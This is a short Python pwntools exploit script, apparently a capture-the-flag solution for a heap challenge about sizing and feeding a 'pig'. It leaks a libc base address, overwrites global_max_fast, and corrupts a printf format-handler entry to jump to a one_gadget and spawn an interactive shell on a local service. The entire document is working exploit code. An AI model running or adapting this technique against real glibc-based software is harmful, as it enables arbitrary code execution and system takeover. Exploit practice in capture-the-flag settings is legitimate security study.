from pwn import *
#p = process("./login")
#p = process(["./pwn"],env={"LD_PRELOAD":'./libc-2.27.so'})
#gdb.attach(p)
#pause()
p = remote("0.0.0.0",10001)
context.log_level='debug'


p.sendlineafter("What size of a pig you want?\n",str(0x1850)) 

p.sendlineafter("Wow! You can get a new size of a pig!",str(0x95e0)) #local 


libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x3ebca0
global_max_fast = libc_base + 0x3ed940
print('libc:',hex(libc_base))
print('global_max_fast',hex(global_max_fast))

#p.sendafter("New name:",b'/bin/sh\x00'+p64(global_max_fast-0x10))
p.sendafter("New name:",b'a'*0x8+p64(global_max_fast-0x10))
p.sendlineafter("Which one?\n",'1')
#gdb.attach(p)
one_gadget = 0x10a2fc+libc_base
#gdb.attach(p)
#pause()

p.sendafter("Feed what?",b'a'*((ord('s')-2)*8)+p64(one_gadget))

# when call printf('%s') then getshell 
p.interactive()
